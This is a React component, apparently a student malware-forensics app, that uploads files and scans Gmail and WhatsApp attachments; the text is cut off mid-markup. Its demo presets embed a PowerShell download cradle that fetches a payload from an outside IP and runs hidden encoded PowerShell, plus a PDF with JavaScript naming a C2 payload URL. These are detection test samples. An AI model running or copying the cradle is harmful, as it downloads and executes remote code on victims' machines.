import React, { useState, useRef, useEffect } from 'react';
import {
  Upload,
  AlertCircle,
  ShieldAlert,
  ArrowRight,
  CheckCircle2,
  RefreshCw,
  FileCode,
  Network,
  Shield,
  ChevronDown,
  ChevronUp,
  Copy,
  Check,
  Sparkles,
  Mail,
  FileText,
  Globe,
  ExternalLink,
  Lock,
  Link as LinkIcon,
  Inbox,
  Paperclip,
  CheckCircle,
  MessageSquare,
  Smartphone,
  Camera,
  Image as ImageIcon,
  KeyRound,
  QrCode,
} from 'lucide-react';
import { api } from '../services/api';
import { InvestigationSummary, EvidenceItem, EmailExtractionResult, EmailAttachment, GmailMessage, GmailInboxResponse } from '../types';
import { ScanVerdictModal } from '../components/modals/ScanVerdictModal';

interface InvestigateProps {
  onInvestigationComplete: (id: string) => void;
  onNavigateToGraph: (id: string) => void;
  onNavigateToDetails: (id: string) => void;
  onNavigateToDefense?: (id: string) => void;
}

export const Investigate: React.FC<InvestigateProps> = ({
  onInvestigationComplete,
  onNavigateToGraph,
  onNavigateToDetails,
  onNavigateToDefense,
}) => {
  // Mode selection: 'file' or 'email'
  const [activeMode, setActiveMode] = useState<'file' | 'email' | 'whatsapp'>('file');

  // File Upload State
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [previewSha256, setPreviewSha256] = useState<string | null>(null);
  const [dragActive, setDragActive] = useState(false);
  const [analyzing, setAnalyzing] = useState(false);
  const [analyzingTargetName, setAnalyzingTargetName] = useState<string>('');
  const [currentStage, setCurrentStage] = useState<number>(0);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<InvestigationSummary | null>(null);
  const [evidence, setEvidence] = useState<EvidenceItem[]>([]);
  const [showPopup, setShowPopup] = useState(false);
  const [showTechnicalDetails, setShowTechnicalDetails] = useState(false);
  const [copiedHash, setCopiedHash] = useState(false);

  // Email Extraction State
  const [emailResult, setEmailResult] = useState<EmailExtractionResult | null>(null);
  const [extractingEmail, setExtractingEmail] = useState(false);
  const [analyzingAttachmentId, setAnalyzingAttachmentId] = useState<string | null>(null);
  const [attachmentLinkUrl, setAttachmentLinkUrl] = useState('');

  // Gmail Live Integration & SRM University Accounts
  const SRM_ACCOUNTS = [
    {
      email: '11024210096@stu.srmuniversity.ac.in',
      name: 'Keerat Kaur',
      role: 'Lead Researcher (B.Tech CSE - DSAI)',
      avatar: 'KK',
      color: 'bg-indigo-600',
    },
    {
      email: '11024210071@stu.srmuniversity.ac.in',
      name: 'Arushi Gupta',
      role: 'Forensic Analyst (B.Tech CSE - DSAI)',
      avatar: 'AG',
      color: 'bg-purple-600',
    },
  ];

  const [selectedStudentEmail, setSelectedStudentEmail] = useState<string>('11024210096@stu.srmuniversity.ac.in');
  const [showAccountSelectorModal, setShowAccountSelectorModal] = useState(false);
  const [gmailLoading, setGmailLoading] = useState(false);
  const [gmailData, setGmailData] = useState<GmailInboxResponse | null>(null);
  const [selectedGmailMessage, setSelectedGmailMessage] = useState<GmailMessage | null>(null);
  const [gmailFilter, setGmailFilter] = useState<'all' | 'unread' | 'attachments'>('attachments');

  // WhatsApp Ingestion & Custom User Phone Number State
  const [waLoading, setWaLoading] = useState(false);
  const [waChats, setWaChats] = useState<any[]>([]);
  const [selectedWaChat, setSelectedWaChat] = useState<any | null>(null);
  const [analyzingWaId, setAnalyzingWaId] = useState<string | null>(null);
  const [userWaNumber, setUserWaNumber] = useState<string>('+91-98110-24210');
  const [userWaDisplayName, setUserWaDisplayName] = useState<string>('Keerat Kaur');
  const [showWaConnectModal, setShowWaConnectModal] = useState(false);
  const [waPhoneInput, setWaPhoneInput] = useState<string>('+91-98110-24210');
  const [waNameInput, setWaNameInput] = useState<string>('Keerat Kaur');
  const [waPairingCode, setWaPairingCode] = useState<string>('4210-ARG9');
  const [waConnected, setWaConnected] = useState<boolean>(true);

  const inputRef = useRef<HTMLInputElement>(null);
  const emailInputRef = useRef<HTMLInputElement>(null);

  const handleOpenEmailMode = () => {
    setActiveMode('email');
    setShowAccountSelectorModal(true);
  };

  const switchAccountAndConnect = async (email: string) => {
    setSelectedStudentEmail(email);
    setShowAccountSelectorModal(false);
    await loadGmailInbox(email);
  };

  const loadGmailInbox = async (accountEmail?: string) => {
    const targetEmail = accountEmail || selectedStudentEmail;
    try {
      setGmailLoading(true);
      setError(null);
      const data = await api.connectGmail(targetEmail);
      setGmailData(data);
      if (data.messages && data.messages.length > 0) {
        setSelectedGmailMessage(data.messages[0]);
      }
    } catch (err: any) {
      console.error('Failed to load Gmail:', err);
      setError(err.message || 'Failed to connect to SRM student mailbox');
    } finally {
      setGmailLoading(false);
    }
  };

  const calculateFileSha256 = async (file: File) => {
    try {
      const buffer = await file.arrayBuffer();
      const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
      const hashArray = Array.from(new Uint8Array(hashBuffer));
      const hashHex = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
      setPreviewSha256(hashHex);
    } catch {
      setPreviewSha256(null);
    }
  };

  const handleSelectFile = (file: File) => {
    const isEmail =
      file.name.toLowerCase().endsWith('.eml') ||
      file.name.toLowerCase().endsWith('.msg') ||
      file.type === 'message/rfc822';

    if (isEmail) {
      setActiveMode('email');
      handleExtractEmailFile(file);
      return;
    }

    setSelectedFile(file);
    calculateFileSha256(file);
    setError(null);
    setResult(null);
  };

  const handleExtractEmailFile = async (file: File) => {
    try {
      setExtractingEmail(true);
      setError(null);
      const res = await api.extractEmail(file);
      setEmailResult(res);
      setSelectedFile(null);
    } catch (err: any) {
      setError(err.message || 'Failed to extract attachments from email');
    } finally {
      setExtractingEmail(false);
    }
  };

  const handleLoadDemoEmail = async () => {
    try {
      setExtractingEmail(true);
      setError(null);
      const demo = await api.getDemoEmailSample();
      const res = await api.extractEmail({ raw_email: demo.raw_eml });
      setEmailResult(res);
      setActiveMode('email');
    } catch (err: any) {
      setError(err.message || 'Failed to load demo phishing email');
    } finally {
      setExtractingEmail(false);
    }
  };

  const loadWhatsAppChats = async (phoneToUse?: string) => {
    const targetPhone = phoneToUse || userWaNumber;
    try {
      setWaLoading(true);
      setError(null);
      const data = await api.getWhatsAppChats(targetPhone);
      setWaChats(data.chats || []);
      if (data.chats && data.chats.length > 0) {
        setSelectedWaChat(data.chats[0]);
      }
    } catch (err: any) {
      console.error('Failed to load WhatsApp:', err);
      setError(err.message || 'Failed to sync WhatsApp chats');
    } finally {
      setWaLoading(false);
    }
  };

  const handlePairWhatsAppNumber = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const phone = waPhoneInput.trim();
    if (!phone) return;
    try {
      setWaLoading(true);
      setError(null);
      const conn = await api.connectWhatsAppNumber(phone, waNameInput.trim() || 'Analyst');
      setUserWaNumber(conn.phone_number);
      setUserWaDisplayName(waNameInput.trim() || 'Analyst');
      setWaPairingCode(conn.pairing_code);
      setWaConnected(true);
      setWaChats(conn.chats || []);
      if (conn.chats && conn.chats.length > 0) {
        setSelectedWaChat(conn.chats[0]);
      }
      setShowWaConnectModal(false);
    } catch (err: any) {
      console.error('WhatsApp pairing error:', err);
      setError(err.message || 'Failed to pair WhatsApp number');
    } finally {
      setWaLoading(false);
    }
  };

  const handleScanWhatsAppMedia = async (msg: any, att: any) => {
    try {
      setAnalyzing(true);
      setAnalyzingTargetName(att.filename);
      setAnalyzingWaId(att.id);
      setError(null);
      setResult(null);

      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const summaryRes = await api.scanWhatsAppMedia({
        message_id: msg.message_id,
        filename: att.filename,
        data_base64: att.data_base64,
        content_type: att.content_type,
        sender_name: selectedWaChat?.sender_name,
        sender_phone: selectedWaChat?.phone_number,
      });

      clearInterval(interval);

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(summaryRes.id),
        api.getEvidence(summaryRes.id),
      ]);

      setResult(invDetail);
      setEvidence(evList || []);
      onInvestigationComplete(invDetail.id);
      setShowPopup(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'WhatsApp media forensic triage failed');
    } finally {
      setAnalyzing(false);
      setAnalyzingWaId(null);
      setCurrentStage(0);
    }
  };

  const handleFetchFromUrl = async () => {
    if (!attachmentLinkUrl.trim()) return;
    try {
      setExtractingEmail(true);
      setError(null);
      const res = await api.extractEmail({ email_url: attachmentLinkUrl.trim() });
      setEmailResult(res);
      setAttachmentLinkUrl('');
      setActiveMode('email');
    } catch (err: any) {
      setError(err.message || 'Failed to fetch email attachment from link');
    } finally {
      setExtractingEmail(false);
    }
  };

  const handleAnalyzeExtractedAttachment = async (att: EmailAttachment) => {
    try {
      setAnalyzing(true);
      setAnalyzingTargetName(att.filename);
      setAnalyzingAttachmentId(att.id);
      setError(null);
      setResult(null);

      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const summaryRes = await api.analyzeEmailAttachment({
        filename: att.filename,
        data_base64: att.data_base64,
        content_type: att.content_type,
      });

      clearInterval(interval);

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(summaryRes.id),
        api.getEvidence(summaryRes.id),
      ]);

      setResult(invDetail);
      setEvidence(evList || []);
      onInvestigationComplete(invDetail.id);
      setShowPopup(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'Attachment forensic processing failed');
    } finally {
      setAnalyzing(false);
      setAnalyzingAttachmentId(null);
      setCurrentStage(0);
    }
  };

  const handleLoadDemoSample = (sampleType: 'exploit_pdf' | 'ps1_script' | 'benign_pdf') => {
    let file: File;
    if (sampleType === 'exploit_pdf') {
      const content =
        '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
      file = new File([content], 'urgent_invoice_action.pdf', { type: 'application/pdf' });
    } else if (sampleType === 'ps1_script') {
      const content =
        '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
      file = new File([content], 'system_update_cradle.ps1', { type: 'text/x-script' });
    } else {
      const content =
        '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\nxref\n0 3\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\ntrailer\n<< /Size 3 /Root 1 0 R >>\nstartxref\n110\n%%EOF';
      file = new File([content], 'academic_research_proposal.pdf', { type: 'application/pdf' });
    }
    handleSelectFile(file);
  };

  const stages = [
    'Secure Ingestion & SHA-256 Nonce Verification',
    'Static Header & Magic Byte Validation',
    'YARA Signature Pattern Compilation & Matching',
    '14-Dimensional Structural Vector Engineering',
    'Supervised Random Forest & Isolation Forest Inference',
    'Causal Attack-Chain Topology Construction',
    'Forensic Incident Report Compilation',
  ];

  const handleFileDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);

    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleSelectFile(e.dataTransfer.files[0]);
      return;
    }

    // Direct Webmail Drag: check if a URL or link was dropped from Gmail / Outlook tab
    const uriList = e.dataTransfer.getData('text/uri-list');
    const plainText = e.dataTransfer.getData('text/plain');
    const targetUrl = uriList || (plainText.startsWith('http') ? plainText : '');

    if (targetUrl) {
      setActiveMode('email');
      setAttachmentLinkUrl(targetUrl);
      api.extractEmail({ email_url: targetUrl })
        .then((res) => {
          setEmailResult(res);
        })
        .catch((err) => {
          setError(err.message || 'Failed to fetch dropped attachment URL');
        });
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleSelectFile(e.target.files[0]);
    }
  };

  const startAnalysis = async () => {
    if (!selectedFile) return;

    try {
      setAnalyzing(true);
      setAnalyzingTargetName(selectedFile.name);
      setError(null);
      setResult(null);

      let stageTimer = 0;
      const interval = setInterval(() => {
        stageTimer += 1;
        if (stageTimer < stages.length) {
          setCurrentStage(stageTimer);
        }
      }, 350);

      const uploadRes = await api.analyzeFile(selectedFile);
      clearInterval(interval);

      const [invDetail, evList] = await Promise.all([
        api.getInvestigation(uploadRes.id),
        api.getEvidence(uploadRes.id),
      ]);
      setResult(invDetail);
      setEvidence(evList || []);
      onInvestigationComplete(invDetail.id);

      setShowPopup(true);
    } catch (err: any) {
      console.error(err);
      setError(err.message || 'File forensics processing error. Please verify backend is running.');
    } finally {
      setAnalyzing(false);
      setCurrentStage(0);
    }
  };

  return (
    <div className="space-y-6 max-w-5xl mx-auto pb-10">
      {/* Header Banner */}
      <div className="p-6 rounded-3xl border border-slate-200 bg-white flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-xs">
        <div>
          <div className="flex items-center gap-2">
            <h1 className="text-xl font-bold text-slate-900 flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-indigo-600" />
              <span>Multi-Layer File Forensics & Triage</span>
            </h1>
            <span className="text-[10px] uppercase font-bold px-2.5 py-0.5 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-200">
              Sandboxed
            </span>
          </div>
          <p className="text-xs text-slate-500 mt-1">
            Safely inspect suspicious files and email attachments directly in isolated memory without downloading to your computer.
          </p>
        </div>

        {/* Quick Sample Presets */}
        <div className="flex items-center gap-2 shrink-0 flex-wrap">
          <span className="text-xs text-slate-400 font-medium">Quick Presets:</span>
          <button
            onClick={() => {
              setActiveMode('file');
              handleLoadDemoSample('benign_pdf');
            }}
            className="px-3 py-1.5 rounded-xl border border-slate-200 bg-slate-50 hover:bg-slate-100 text-slate-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            Clean PDF
          </button>
          <button
            onClick={() => {
              setActiveMode('file');
              handleLoadDemoSample('exploit_pdf');
            }}
            className="px-3 py-1.5 rounded-xl border border-rose-200 bg-rose-50 hover:bg-rose-100 text-rose-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            Exploit PDF
          </button>
          <button
            onClick={() => {
              setActiveMode('file');
              handleLoadDemoSample('ps1_script');
            }}
            className="px-3 py-1.5 rounded-xl border border-amber-200 bg-amber-50 hover:bg-amber-100 text-amber-700 text-xs font-semibold cursor-pointer transition-colors"
          >
            PowerShell Cradle
          </button>
          <button
            onClick={handleLoadDemoEmail}
            className="px-3 py-1.5 rounded-xl border border-purple-200 bg-purple-50 hover:bg-purple-100 text-purple-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5"
          >
            <Mail className="w-3.5 h-3.5" />
            <span>Test Email Attachment</span>
          </button>
        </div>
      </div>

      {/* Mode Switcher Tabs */}
      <div className="flex items-center gap-2 bg-slate-100 p-1.5 rounded-2xl w-fit border border-slate-200">
        <button
          onClick={() => setActiveMode('file')}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
            activeMode === 'file'
              ? 'bg-white text-indigo-700 shadow-xs border border-slate-200'
              : 'text-slate-600 hover:text-slate-900'
          }`}
        >
          <Upload className="w-4 h-4" />
          <span>Local File Upload</span>
        </button>

        <button
          onClick={handleOpenEmailMode}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
            activeMode === 'email'
              ? 'bg-white text-indigo-700 shadow-xs border border-slate-200'
              : 'text-slate-600 hover:text-slate-900'
          }`}
        >
          <Mail className="w-4 h-4 text-indigo-600" />
          <span>Live Gmail & Email Forensics</span>
          <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 font-semibold border border-emerald-200">
            SRM Live Mailbox
          </span>
        </button>

        <button
          onClick={() => {
            setActiveMode('whatsapp');
            if (waChats.length === 0) {
              loadWhatsAppChats();
            }
          }}
          className={`flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer ${
            activeMode === 'whatsapp'
              ? 'bg-white text-emerald-700 shadow-xs border border-slate-200'
              : 'text-slate-600 hover:text-slate-900'
          }`}
        >
          <MessageSquare className="w-4 h-4 text-emerald-600" />
          <span>WhatsApp Media Triage</span>
          <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 font-semibold border border-emerald-200">
            Live Chat Files & Snaps
          </span>
        </button>
      </div>

      {/* MODE 1: Standard File Drag & Drop */}
      {activeMode === 'file' && (
        <div className="space-y-4">
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDrop={handleFileDrop}
            onClick={() => inputRef.current?.click()}
            className={`p-10 rounded-3xl border-2 border-dashed text-center transition-all cursor-pointer bg-white shadow-xs ${
              dragActive
                ? 'border-indigo-500 bg-indigo-50/60 scale-[1.01]'
                : selectedFile
                ? 'border-indigo-400 bg-indigo-50/20'
                : 'border-slate-300 hover:border-indigo-400 hover:bg-slate-50/60'
            }`}
          >
            <input
              ref={inputRef}
              type="file"
              onChange={handleFileChange}
              className="hidden"
            />

            <div className="w-14 h-14 rounded-2xl border border-indigo-100 bg-indigo-50 flex items-center justify-center mx-auto mb-3 text-indigo-600 shadow-xs">
              <Upload className="w-7 h-7 text-indigo-600" />
            </div>

            {selectedFile ? (
              <div className="space-y-1.5">
                <div className="text-base font-bold text-slate-900 flex items-center justify-center gap-2">
                  <FileCode className="w-5 h-5 text-indigo-600" />
                  <span>{selectedFile.name}</span>
                </div>
                <div className="text-xs text-slate-500 font-mono">
                  Size: {(selectedFile.size / 1024).toFixed(1)} KB • Type: {selectedFile.type || 'Binary / Unspecified'}
                </div>
                {previewSha256 && (
                  <div className="text-[11px] font-mono text-slate-500 pt-1">
                    SHA-256: <span className="text-slate-800 select-all font-semibold">{previewSha256}</span>
                  </div>
                )}
                <div className="text-[11px] text-slate-400 pt-2 font-mono">
                  Click or drag another file to replace (or drop .eml / .msg to extract email attachments)
                </div>
              </div>
            ) : (
              <div>
                <div className="text-base font-bold text-slate-900">
                  Select or drag and drop a suspicious file or email here
                </div>
                <div className="text-xs text-slate-500 mt-1">
                  Supports binaries (.exe, .dll, .elf), documents (.pdf, .docm), scripts, and email (.eml, .msg)
                </div>
              </div>
            )}
          </div>

          {/* Action Buttons for Selected File */}
          {selectedFile && !analyzing && !result && (
            <div className="flex items-center justify-end gap-3">
              <button
                onClick={() => setSelectedFile(null)}
                className="px-4 py-2 rounded-xl border border-slate-200 hover:bg-slate-100 text-xs font-semibold text-slate-600 cursor-pointer transition-colors"
              >
                Clear Selection
              </button>
              <button
                onClick={startAnalysis}
                className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white text-xs font-semibold shadow-md shadow-indigo-500/20 cursor-pointer transition-all active:scale-95"
              >
                <ShieldAlert className="w-4 h-4 text-white" />
                <span>Execute Forensic Analysis</span>
              </button>
            </div>
          )}
        </div>
      )}

      {/* MODE 2: Email Attachment Extractor & Gmail Live Integration */}
      {activeMode === 'email' && (
        <div className="space-y-6">
          {/* Top Gmail Connected Header & Direct Controls */}
          <div className="p-6 rounded-3xl border border-slate-200 bg-white shadow-xs">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-5 border-b border-slate-100">
              <div className="flex items-center gap-3.5">
                <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-red-500 to-rose-600 flex items-center justify-center text-white shadow-md shadow-rose-500/20">
                  <Mail className="w-6 h-6 text-white" />
                </div>
                <div>
                  <div className="flex items-center gap-2">
                    <h3 className="text-base font-bold text-slate-900">Live Gmail Inbox Integration</h3>
                    <span className="flex items-center gap-1 text-[11px] font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                      Connected
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-xs text-slate-500 mt-1">
                    <span>Active Account:</span>
                    <span className="font-mono font-bold text-indigo-700 bg-indigo-50 px-2 py-0.5 rounded-md border border-indigo-100">
                      {selectedStudentEmail}
                    </span>
                    <button
                      onClick={() => setShowAccountSelectorModal(true)}
                      className="text-xs font-semibold text-indigo-600 hover:text-indigo-800 underline cursor-pointer ml-1"
                    >
                      Switch Email Account
                    </button>
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-2 shrink-0">
                <button
                  onClick={() => setShowAccountSelectorModal(true)}
                  className="px-3.5 py-2 rounded-xl border border-indigo-200 bg-indigo-50/70 hover:bg-indigo-100/70 text-indigo-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5 shadow-xs"
                >
                  <Mail className="w-3.5 h-3.5" />
                  <span>Select Student Account</span>
                </button>
                <button
                  onClick={() => loadGmailInbox()}
                  disabled={gmailLoading}
                  className="px-3.5 py-2 rounded-xl border border-slate-200 hover:bg-slate-50 text-slate-700 text-xs font-semibold cursor-pointer transition-colors flex items-center gap-1.5 shadow-xs"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${gmailLoading ? 'animate-spin text-indigo-600' : 'text-slate-500'}`} />
                  <span>Sync Inbox</span>
                </button>
                <button
                  type="button"
                  onClick={handleLoadDemoEmail}
                  className="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold cursor-pointer transition-all flex items-center gap-1.5 shadow-xs active:scale-95"
                >
                  <Sparkles className="w-3.5 h-3.5" />
                  <span>Simulate Phishing Email</span>
                </button>
              </div>
            </div>

            {/* Gmail Live Inbox Browser */}
            <div className="pt-5">
              <div className="flex items-center justify-between pb-3">
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold text-slate-900 uppercase tracking-wider">Inbox Messages</span>
                  <span className="text-xs px-2 py-0.5 rounded-full bg-indigo-50 text-indigo-700 font-mono font-semibold">
                    {gmailData?.messages.length || 0}
                  </span>
                </div>
                <div className="flex items-center gap-1 text-xs">
                  <button
                    onClick={() => setGmailFilter('attachments')}
                    className={`px-3 py-1 rounded-lg text-xs font-semibold transition-colors ${
                      gmailFilter === 'attachments' ? 'bg-indigo-50 text-indigo-700 border border-indigo-200' : 'text-slate-500 hover:text-slate-800'
                    }`}
                  >
                    With Attachments
                  </button>
                  <button
                    onClick={() => setGmailFilter('all')}
                    className={`px-3 py-1 rounded-lg text-xs font-semibold transition-colors ${
                      gmailFilter === 'all' ? 'bg-indigo-50 text-indigo-700 border border-indigo-200' : 'text-slate-500 hover:text-slate-800'
                    }`}
                  >
                    All Messages
                  </button>
                </div>
              </div>

              {gmailLoading && !gmailData ? (
                <div className="py-12 flex flex-col items-center justify-center text-slate-500 text-xs">
                  <RefreshCw className="w-6 h-6 animate-spin text-indigo-600 mb-2" />
                  <span>Syncing Gmail telemetry and message queue...</span>
                </div>
              ) : (
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
                  {/* Left: Email List */}
                  <div className="lg:col-span-5 space-y-2 max-h-[360px] overflow-y-auto pr-1">
                    {gmailData?.messages.map((msg) => {
                      const isSelected = selectedGmailMessage?.id === msg.id;
                      return (
                        <div
                          key={msg.id}
                          onClick={() => {
                            setSelectedGmailMessage(msg);
                            setEmailResult({
                              email_format: 'MIME/RFC822',
                              original_name: msg.subject + '.eml',
                              subject: msg.subject,
                              sender: msg.sender,
                              recipient: 'analyst@argus-defense.ai',
                              date: msg.date,
                              spf_status: msg.spf_status,
                              dkim_status: msg.dkim_status,
                              originating_ip: msg.originating_ip,
                              body_snippet: msg.snippet,
                              attachment_count: msg.attachments.length,
                              attachments: msg.attachments,
                              embedded_urls: [],
                            });
                          }}
                          className={`p-3.5 rounded-2xl border text-left cursor-pointer transition-all ${
                            isSelected
                              ? 'border-indigo-500 bg-indigo-50/50 shadow-xs'
                              : 'border-slate-200 hover:border-slate-300 hover:bg-slate-50/70 bg-white'
                          }`}
                        >
                          <div className="flex items-center justify-between gap-2">
                            <span className="text-[11px] font-bold text-slate-800 truncate">{msg.sender.split('<')[0].trim()}</span>
                            <span className="text-[10px] text-slate-400 shrink-0 font-mono">{msg.date}</span>
                          </div>
                          <div className="text-xs font-semibold text-slate-900 truncate mt-0.5">{msg.subject}</div>
                          <div className="text-[11px] text-slate-500 line-clamp-1 mt-1">{msg.snippet}</div>
                          <div className="flex items-center gap-2 mt-2 pt-2 border-t border-slate-100">
                            <span className="flex items-center gap-1 text-[10px] font-semibold text-slate-600">
                              <Paperclip className="w-3 h-3 text-indigo-500" />
                              <span>{msg.attachments.length} attachment{msg.attachments.length > 1 ? 's' : ''}</span>
                            </span>
                            {msg.spf_status === 'FAIL' && (
                              <span className="text-[9px] font-bold px-1.5 py-0.2 rounded bg-rose-50 text-rose-700 border border-rose-200">
                                SPF FAIL
                              </span>
                            )}
                          </div>
                        </div>
                      );
                    })}
                  </div>

                  {/* Right: Message Details & Instant Attachment Triage */}
                  <div className="lg:col-span-7 p-4 rounded-2xl border border-slate-200 bg-slate-50/60 flex flex-col justify-between">
                    {selectedGmailMessage ? (
                      <div className="space-y-4">
                        <div className="border-b border-slate-200 pb-3">
                          <div className="flex items-start justify-between gap-2">
                            <div>
                              <h4 className="text-sm font-bold text-slate-900">{selectedGmailMessage.subject}</h4>
                              <div className="text-xs text-slate-600 mt-1 space-y-0.5">
                                <div><span className="text-slate-400 font-semibold">From:</span> {selectedGmailMessage.sender}</div>
                                <div><span className="text-slate-400 font-semibold">Originating IP:</span> <span className="font-mono text-slate-800 font-medium">{selectedGmailMessage.originating_ip}</span></div>
                              </div>
                            </div>
                            <div className="flex flex-col items-end gap-1.5 shrink-0">
                              <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                                selectedGmailMessage.spf_status === 'PASS' ? 'bg-emerald-50 text-emerald-700 border-emerald-200' : 'bg-rose-50 text-rose-700 border-rose-200'
                              }`}>
                                SPF: {selectedGmailMessage.spf_status}
                              </span>
                              <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full border ${
                                selectedGmailMessage.dkim_status === 'PASS' ? 'bg-emerald-50 text-emerald-700 border-emerald-200' : 'bg-rose-50 text-rose-700 border-rose-200'
                              }`}>
                                DKIM: {selectedGmailMessage.dkim_status}
                              </span>
                            </div>
                          </div>
                          <p className="text-xs text-slate-700 mt-3 p-3 bg-white rounded-xl border border-slate-200/80 italic leading-relaxed">
                            "{selectedGmailMessage.snippet}"
                          </p>
                        </div>

                        {/* Attachments Section in Selected Message */}
                        <div>
                          <div className="text-xs font-bold text-slate-900 mb-2 flex items-center justify-between">
                            <span>Detected Attachments ({selectedGmailMessage.attachments.length})</span>
                            <span className="text-[10px] text-emerald-700 font-medium bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
                              Isolated in RAM Buffer
                            </span>
                          </div>

                          <div className="space-y-2">
                            {selectedGmailMessage.attachments.map((att) => {
                              const isAnalyzingThis = analyzing && analyzingAttachmentId === att.id;
                              return (
                                <div
                                  key={att.id}
                                  className="p-3 bg-white rounded-xl border border-slate-200 shadow-xs flex items-center justify-between gap-3"
                                >
                                  <div className="flex items-center gap-2.5 min-w-0">
                                    <div className={`p-2 rounded-lg ${att.is_suspicious ? 'bg-rose-50 text-rose-600' : 'bg-indigo-50 text-indigo-600'}`}>
                                      <FileCode className="w-4 h-4" />
                                    </div>
                                    <div className="min-w-0">
                                      <div className="text-xs font-bold text-slate-900 truncate">{att.filename}</div>
                                      <div className="text-[10px] text-slate-400 font-mono">
                                        {(att.size_bytes / 1024).toFixed(1)} KB • {att.content_type}
                                      </div>
                                    </div>
                                  </div>

                                  <div className="flex items-center gap-2 shrink-0">
                                    {att.is_suspicious && (
                                      <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-rose-50 text-rose-700 border border-rose-200">
                                        Exploit Risk
                                      </span>
                                    )}
                                    <button
                                      disabled={analyzing}
                                      onClick={() => handleAnalyzeExtractedAttachment(att)}
                                      className="px-3.5 py-1.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold cursor-pointer transition-all flex items-center gap-1.5 shadow-xs disabled:opacity-50 active:scale-95"
                                    >
                                      {isAnalyzingThis ? (
                                        <>
                                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                                          <span>Scanning...</span>
                                        </>
                                      ) : (
                                        <>
                                          <ShieldAlert className="w-3.5 h-3.5" />
                                          <span>Scan in Sandbox</span>
                                        </>
                                      )}
                                    </button>
                                  </div>
                                </div>
                              );
                            })}
                          </div>
                        </div>
                      </div>
                    ) : (
                      <div className="py-16 text-center text-xs text-slate-400">
                        Select a message from your Gmail inbox to inspect attachments
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>

          {/* Email Direct Drop Zone */}
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDrop={(e) => {
              e.preventDefault();
              setDragActive(false);
              if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                handleExtractEmailFile(e.dataTransfer.files[0]);
                return;
              }
              const uriList = e.dataTransfer.getData('text/uri-list');
              const plainText = e.dataTransfer.getData('text/plain');
              const targetUrl = uriList || (plainText.startsWith('http') ? plainText : '');
              if (targetUrl) {
                setAttachmentLinkUrl(targetUrl);
                api.extractEmail({ email_url: targetUrl })
                  .then((res) => setEmailResult(res))
